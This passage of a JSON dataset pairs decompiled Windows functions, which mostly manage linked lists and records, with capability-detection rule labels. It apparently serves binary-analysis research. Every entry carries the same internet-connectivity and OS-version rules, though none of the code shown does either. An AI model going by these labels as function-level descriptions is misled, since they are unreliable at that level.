     var_4ch = fcn.00023130(var_58h, arg_ch, arg_10h, *arg_20h, arg_14h, var_4h, arg_18h);\n        uVar2 = fcn.000232a0(*(var_58h + 0x34), arg_ch, arg_10h);\n        fcn.00023660(uVar2);\n    }\ncode_r0x000225da:\n    fcn.00023e00(&var_54h);\n    return var_4ch;\n}\n",
        "token_count": 916
    },
    "000225f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000225f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023cd0(&var_10h, arg_8h, 0, &var_ch);\n        if (var_4h == 0) {\n            fcn.000240f0(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.000232a0(arg_8h_01, arg_ch, arg_10h);\n            iVar1 = fcn.000233f0(arg_8h_00, arg_8h_01);\n            if (iVar1 == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), arg_18h, 0x40, iVar1);\n                if (iVar1 == -1) {\n                    var_4h = 3;\n                }\n                else {\n                    var_4h = 0;\n                }\n            }\n            fcn.00023e00(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 391
    },
    "000226b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000226b0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        var_8h = -1;\n    }\n    else {\n        var_8h = fcn.00023cd0(&var_18h, arg_8h, 0, &var_10h);\n        if (var_8h == 0) {\n            fcn.000240f0(var_18h, &arg_ch);\n            var_8h = 5;\n            var_4h = fcn.000232a0(*(var_18h + 0x34), arg_ch, arg_10h);\n            if (var_4h != 0) {\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    if ((arg_14h == NULL) || (*(var_14h + 8) == *arg_14h)) {\n                        iVar1 = (**(*(var_18h + 0x44) + 0x14))(*(var_18h + 0x48), arg_18h, 0x40, *(var_14h + 0xc));\n                        if (iVar1 == 0) {\n                            var_8h = 0;\n                        }\n                        break;\n                    }\n                }\n            }\n            fcn.00023e00(&var_10h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 420
    },
    "00022790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022790(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_14h == NULL) {\n        return -1;\n    }\n    var_8h = fcn.00023cd0(&var_18h, arg_8h, 0, &var_10h);\n    if (var_8h != 0) {\n        return var_8h;\n    }\n    fcn.000240f0(var_18h, &arg_ch);\n    if (arg_18h != NULL) {\n        *arg_18h = 0;\n    }\n    *arg_14h = 0;\n    var_4h = fcn.000232a0(*(var_18h + 0x34), arg_ch, arg_10h);\n    if (var_4h != 0) {\n        for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n            *arg_14h = *arg_14h + 1;\n        }\n        if ((arg_18h != NULL) && (*arg_14h != 0)) {\n            iVar1 = fcn.000356c0(*arg_14h << 6);\n            *arg_18h = iVar1;\n            if (*arg_18h == 0) {\n                var_8h = 2;\n                goto code_r0x00022a43;\n            }\n            if (((*arg_14h < 2) || (**(var_18h + 0x44) <= (*(var_18h + 0x44) + 0x20) - *(var_18h + 0x44))) ||\n               (*(*(var_18h + 0x44) + 0x20) == 0)) {\n                *arg_14h = 0;\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    iVar1 = (**(*(var_18h + 0x44) + 0x14))\n                                      (*(var_18h + 0x48), *arg_14h * 0x40 + *arg_18h, 0x40, *(var_14h + 0xc));\n                    if (iVar1 == -1) {\n                        var_8h = 3;\n                        fcn.000357f0(*arg_18h);\n                        *arg_18h = 0;\n                        *arg_14h = 0;\n                        goto code_r0x00022a43;\n                    }\n                    *arg_14h = *arg_14h + 1;\n                }\n            }\n            else {\n                iVar1 = fcn.000357b0(*arg_14h, 0xc);\n                if (iVar1 == 0) {\n                    var_8h = 2;\n                    goto code_r0x00022a43;\n                }\n                *arg_14h = 0;\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    *(iVar1 + *arg_14h * 0xc) = *arg_14h * 0x40 + *arg_18h;\n                    *(iVar1 + 4 + *arg_14h * 0xc) = *(var_14h + 0xc);\n                    *(iVar1 + 8 + *arg_14h * 0xc) = 0x40;\n                    *arg_14h = *arg_14h + 1;\n                }\n                iVar2 = (**(*(var_18h + 0x44) + 0x20))(*(var_18h + 0x48), iVar1, *arg_14h);\n                if (iVar2 != 0) {\n                    var_8h = 3;\n                    fcn.000357f0(iVar1);\n                    fcn.000357f0(*arg_18h);\n                    *arg_18h = 0;\n                    *arg_14h = 0;\n                    goto code_r0x00022a43;\n                }\n                fcn.000357f0(iVar1);\n            }\n        }\n    }\n    var_8h = 0;\ncode_r0x00022a43:\n    fcn.00023e00(&var_10h);\n    return var_8h;\n}\n",
        "token_count": 1103
    },
    "00022a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00022a60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_18h == 0) && (arg_1ch != 0)) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023cd0(0, arg_8h, 5, &var_10h);\n        if (var_4h == 0) {\n            var_4h = fcn.00022430(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_8h);\n            if ((var_4h == 0) &&\n               (var_4h = fcn.000222d0(arg_8h, arg_ch, arg_10h, var_8h, 0, arg_18h, arg_1ch),  var_4h != 0)) {\n                fcn.00021e60(arg_8h, arg_ch, arg_10h, var_8h);\n            }\n            fcn.00023e00(&var_10h);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 327
    },
    "00022b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022b20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023cd0(&var_10h, arg_8h, 0, &var_ch);\n    if (var_4h == 0) {\n        *(var_10h + 100) = arg_ch;\n        *(var_10h + 0x68) = arg_10h;\n        *(var_10h + 0x60) = 1;\n        fcn.00023e00(&var_ch);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 176
    },
    "00022b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00022b80(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_1ch;\n    uint var_14h;\n    char *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == '\\0')) {\n        var_ch = 0;\n    }\n    else {\n        var_10h = arg_8h;\n        do {\n            cVar1 = *var_10h;\n            var_10h = var_10h + 1;\n        } while (cVar1 != '\\0');\n        var_ch = 0;\n        for (var_8h = 0; var_8h < var_10h - (arg_8h + 1); var_8h = var_8h + 1) {\n            var_ch = var_ch << 3 ^ arg_8h[var_8h];\n        }\n        var_ch = (var_10h - (arg_8h + 1)) + 1U & 0xffff ^ var_ch;\n        if (var_ch == 0) {\n            var_ch = 0xffffffff;\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 287
    },
    "00022c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022c30(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t *var_88h;\n    int32_t *var_84h;\n    uint32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_4ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_38h = 0;\n    var_7ch = 0;\n    if (arg_8h == 0) {\n        return -1;\n    }\n    fcn.00022f50(arg_8h);\n    puVar3 = arg_8h + 8;\n    puVar4 = &var_34h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if (*(arg_8h + 8) <= *(arg_8h + 0x1c) && *(arg_8h + 0x1c) != *(arg_8h + 8)) {\n        *(arg_8h + 0x1c) = *(arg_8h + 8);\n        iVar2 = fcn.00023e30(arg_8h, 0);\n        if (iVar2 != 0) {\n            var_4h = 3;\n            goto code_r0x00022f24;\n        }\n    }\n    for (var_8h = 0x2c; var_8h < *(arg_8h + 0x1c); var_8h = var_8h + 0x40 + var_4ch) {\n        iVar2 = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_78h, 0x40, var_8h);\n        if (iVar2 != 0) {\n            var_4h = 3;\n            goto code_r0x00022f24;\n        }\n        if (((*(arg_8h + 0x1c) <= var_8h + 0x40 && var_8h + 0x40 != *(arg_8h + 0x1c)) ||\n            (var_8h + 0x40 + var_4ch <= var_8h)) ||\n           (uVar1 = var_8h + 0x40 + var_4ch,  *(arg_8h + 0x1c) <= uVar1 && uVar1 != *(arg_8h + 0x1c))) break;\n        if (var_70h == 0xffff) {\n            var_38h = var_38h + 1;\n        }\n        else {\n            var_7ch = var_7ch + 1;\n            var_4h = fcn.00023030(arg_8h, var_78h, var_70h, var_74h);\n            if (var_4h != 0) goto code_r0x00022f24;\n            var_4h = fcn.00023130(arg_8h, var_78h, var_70h, var_74h, var_6ch, var_8h, var_4ch);\n            if (var_4h != 0) goto code_r0x00022f24;\n        }\n    }\n    *(arg_8h + 0x18) = var_7ch;\n    *(arg_8h + 0x20) = var_38h;\n    *(arg_8h + 0x1c) = var_8h;\n    var_84h = &var_34h;\n    var_88h = arg_8h + 8;\n    for (var_80h = 0x2c; 3 < var_80h; var_80h = var_80h - 4) {\n        if (*var_88h != *var_84h) goto code_r0x00022e10;\n        var_84h = var_84h + 1;\n        var_88h = var_88h + 1;\n    }\n    if (var_80h == 0) {\ncode_r0x00022ed0:\n        var_90h = 0;\n    }\n    else {\ncode_r0x00022e10:\n        var_8ch = *var_88h - *var_84h;\n        if (var_8ch == 0) {\n            if (var_80h == 1) goto code_r0x00022ed0;\n            var_8ch = *(var_88h + 1) - *(var_84h + 1);\n            if (var_8ch == 0) {\n                if (var_80h == 2) goto code_r0x00022ed0;\n                var_8ch = *(var_88h + 2) - *(var_84h + 2);\n                if (var_8ch == 0) {\n                    if ((var_80h == 3) || (var_8ch = *(var_88h + 3) - *(var_84h + 3),  var_8ch == 0))\n                    goto code_r0x00022ed0;\n                }\n            }\n        }\n        var_90h = 1;\n        if (var_8ch < 1) {\n            var_90h = -1;\n        }\n    }\n    if ((var_90h != 0) && (iVar2 = fcn.00023e30(arg_8h, 1),  iVar2 != 0)) {\n        var_4h = 3;\n    }\ncode_r0x00022f24:\n    if (var_4h != 0) {\n        puVar3 = &var_34h;\n        puVar4 = arg_8h + 8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 1517
    },
    "00022f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00022f50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        while (*(arg_8h + 0x34) != 0) {\n            var_8h = *(*(arg_8h + 0x34) + 0x10);\n            while (var_8h != 0) {\n                if (*(var_8h + 0x18) == 0) {\n                    *(arg_8h + 0x38) = *(var_8h + 0x1c);\n                }\n                else {\n                    *(*(var_8h + 0x18) + 0x1c) = *(var_8h + 0x1c);\n                }\n                if (*(var_8h + 0x1c) == 0) {\n                    *(arg_8h + 0x3c) = *(var_8h + 0x18);\n                }\n                else {\n                    *(*(var_8h + 0x1c) + 0x18) = *(var_8h + 0x18);\n                }\n                iVar1 = *(var_8h + 0x14);\n                fcn.000357f0(var_8h);\n                var_8h = iVar1;\n            }\n            arg_8h_00 = *(arg_8h + 0x34);\n            *(arg_8h + 0x34) = *(*(arg_8h + 0x34) + 0x18);\n            fcn.000357f0(arg_8h_00);\n        }\n        *(arg_8h + 0x34) = 0;\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "00023030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023030(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        for (var_4h = *(arg_8h + 0x34); var_4h != NULL; var_4h = var_4h[6]) {\n            if ((*var_4h == arg_ch) && (var_4h[1] == arg_10h)) {\n                if (var_4h[3] <= arg_14h && arg_14h != var_4h[3]) {\n                    var_4h[3] = arg_14h;\n                }\n                if (arg_14h < var_4h[2]) {\n                    var_4h[2] = arg_14h;\n                }\n                goto code_r0x000230ad;\n            }\n        }\n        fcn.000230c0(arg_8h, arg_ch, arg_10h, arg_14h);\ncode_r0x000230ad:\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 292
    },
    "000230c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.000230c0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint var_4h;\n    \n    puVar1 = fcn.000356c0(0x1c);\n    if (puVar1 == NULL) {\n        puVar1 = NULL;\n    }\n    else {\n        *puVar1 = arg_ch;\n        puVar1[1] = arg_10h;\n        puVar1[2] = arg_14h;\n        puVar1[3] = arg_14h;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = *(arg_8h + 0x34);\n        *(arg_8h + 0x34) = puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 207
    },
    "00023130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00023130(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        arg_8h_00 = fcn.000356c0(0x24);\n        if (arg_8h_00 == NULL) {\n            uVar2 = 2;\n        }\n        else {\n            arg_8h_00[3] = arg_1ch;\n            *arg_8h_00 = arg_14h;\n            arg_8h_00[1] = arg_20h;\n            arg_8h_00[2] = arg_18h;\n            var_ch = fcn.000232a0(*(arg_8h + 0x34), arg_ch, arg_10h);\n            if ((var_ch == 0) && (var_ch = fcn.000230c0(arg_8h, arg_ch, arg_10h, 0),  var_ch == 0)) {\n                fcn.000357f0(arg_8h_00);\n                return 0xffffffff;\n            }\n            if (*(var_ch + 0x10) == 0) {\n                arg_8h_00[5] = 0;\n                arg_8h_00[4] = 0;\n                *(var_ch + 0x14) = arg_8h_00;\n                *(var_ch + 0x10) = arg_8h_00;\n            }\n            else {\n                iVar1 = *(var_ch + 0x14);\n                *(iVar1 + 0x14) = arg_8h_00;\n                arg_8h_00[5] = 0;\n                arg_8h_00[4] = iVar1;\n                *(var_ch + 0x14) = arg_8h_00;\n            }\n            if (*(arg_8h + 0x38) == 0) {\n                arg_8h_00[6] = 0;\n                arg_8h_00[7] = 0;\n                *(arg_8h + 0x3c) = arg_8h_00;\n                *(arg_8h + 0x38) = arg_8h_00;\n            }\n            else {\n                *(*(arg_8h + 0x3c) + 0x1c) = arg_8h_00;\n                arg_8h_00[6] = *(arg_8h + 0x3c);\n                arg_8h_00[7] = 0;\n                *(arg_8h + 0x3c) = arg_8h_00;\n            }\n            arg_8h_00[8] = var_ch;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 708
    },
    "000232a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.000232a0(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return NULL;\n        }\n        if ((*var_4h == arg_ch) && (var_4h[1] == arg_10h)) break;\n        var_4h = var_4h[6];\n    }\n    return var_4h;\n}\n",
        "token_count": 134
    },
    "00023340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023340(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_ch < 0x40000001) && (arg_8h != 0)) {\n        fcn.00022f50(arg_8h);\n        (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 2);\n        iVar2 = (**(*(arg_8h + 0x44) + 0xc))(*(arg_8h + 0x48), arg_ch);\n        if (iVar2 == 0) {\n            *(arg_8h + 8) = arg_ch;\n            iVar2 = fcn.00023e30(arg_8h, 1);\n            if (iVar2 == 0) {\n                uVar1 = fcn.00022c30(arg_8h);\n                (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 1);\n            }\n            else {\n                uVar1 = 3;\n            }\n        }\n        else {\n            fcn.00022c30(arg_8h);\n            uVar1 = 0xffffffff;\n        }\n    }\n    else {\n        uVar1 = 3;\n    }\n    return uVar1;\n}\n",
        "token_count": 322
    },
    "000233f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000233f0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00023440(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        var_8h = 0xffffffff;\n    }\n    else if (*(iVar1 + 0xc) < 0x2c) {\n        var_8h = 0xffffffff;\n    }\n    else {\n        var_8h = *(iVar1 + 0xc);\n    }\n    return var_8h;\n}\n",
        "token_count": 142
    },
    "00023440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00023440(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = NULL;\n    }\n    else {\n        for (var_4h = *(arg_8h + 0x10); (var_4h != NULL && (*var_4h != arg_ch)); var_4h = var_4h[5]) {\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 125
    },
    "000234c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000234c0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_58h;\n    uint var_50h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        return;\n    }\n    if (arg_ch == 0) {\n        return;\n    }\n    var_ch = fcn.00023440(arg_ch, arg_10h);\n    if (var_ch == 0) {\n        return;\n    }\n    if (arg_14h != 0) {\n        var_14h = fcn.000233f0(arg_ch, arg_10h);\n        if (var_14h == -1) {\n            return;\n        }\n        iVar1 = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_58h, 0x40, var_14h);\n        if (iVar1 != 0) {\n            return;\n        }\n        var_4h = var_50h;\n        var_50h = 0xffff;\n        iVar1 = (**(*(arg_8h + 0x44) + 0x18))(*(arg_8h + 0x48), &var_58h, 0x40, var_14h);\n        if (iVar1 != 0) {\n            return;\n        }\n        *(arg_8h + 0x18) = *(arg_8h + 0x18) + -1;\n        *(arg_8h + 0x20) = *(arg_8h + 0x20) + 1;\n        if (arg_14h != 2) {\n            fcn.00023e30(arg_8h, 1);\n        }\n    }\n    var_8h = *(var_ch + 0x10);\n    var_10h = *(var_ch + 0x14);\n    if (var_8h == 0) {\n        *(arg_ch + 0x10) = *(var_ch + 0x14);\n    }\n    else {\n        *(var_8h + 0x14) = var_10h;\n    }\n    if (var_10h == 0) {\n        *(arg_ch + 0x14) = var_8h;\n    }\n    else {\n        *(var_10h + 0x10) = var_8h;\n    }\n    if (*(var_ch + 0x18) == 0) {\n        *(arg_8h + 0x38) = *(var_ch + 0x1c);\n    }\n    else {\n        *(*(var_ch + 0x18) + 0x1c) = *(var_ch + 0x1c);\n    }\n    if (*(var_ch + 0x1c) == 0) {\n        *(arg_8h + 0x3c) = *(var_ch + 0x18);\n    }\n    else {\n        *(*(var_ch + 0x1c) + 0x18) = *(var_ch + 0x18);\n    }\n    fcn.000357f0(var_ch);\n    if (arg_14h != 2) {\n        fcn.00023660(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 784
    },
    "00023660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023660(int32_t arg_8h)\n\n{\n    uint32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (arg_8h != 0) {\n        var_4h = *(arg_8h + 0x10);\n        if (var_4h == NULL) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = *var_4h;\n        }\n        *(arg_8h + 0xc) = var_8h;\n        *(arg_8h + 8) = var_8h;\n        for (; var_4h != NULL; var_4h = var_4h[5]) {\n            if (*var_4h < *(arg_8h + 8)) {\n                *(arg_8h + 8) = *var_4h;\n            }\n            if (*(arg_8h + 0xc) <= *var_4h && *var_4h != *(arg_8h + 0xc)) {\n                *(arg_8h + 0xc) = *var_4h;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "000236f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000236f0(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = *(arg_8h + 0xc);\n    }\n    return var_4h;\n}\n",
        "token_count": 80
    },
    "00023720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023720(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch == 0)) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar3 = *(arg_ch + 0x2c) + 0x40;\n        if (arg_8h[2] <= arg_8h[7] + iVar3 && arg_8h[7] + iVar3 != arg_8h[2]) {\n            var_4h = fcn.000232e0(arg_8h, iVar3);\n            if (arg_8h[4] <= var_4h) {\n                fcn.00021740(*arg_8h);\n                var_4h = fcn.000232e0(arg_8h, iVar3);\n                if (arg_8h[4] <= var_4h) {\n                    return 0xffffffff;\n                }\n            }\n            iVar2 = fcn.00023340(arg_8h, var_4h);\n            if (iVar2 != 0) {\n                fcn.00021740(*arg_8h);\n                iVar2 = fcn.00023340(arg_8h, var_4h);\n                if (iVar2 != 0) {\n                    return 0xffffffff;\n                }\n            }\n        }\n        uVar1 = arg_8h[7];\n        iVar2 = (**(arg_8h[0x11] + 0x18))(arg_8h[0x12], arg_ch, 0x40, uVar1);\n        if (iVar2 == 0) {\n            arg_8h[7] = arg_8h[7] + iVar3;\n            arg_8h[6] = arg_8h[6] + 1;\n            iVar3 = fcn.00023e30(arg_8h, 1);\n            if (iVar3 != 0) {\n                uVar1 = 0xffffffff;\n            }\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 513
    },
    "00023840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
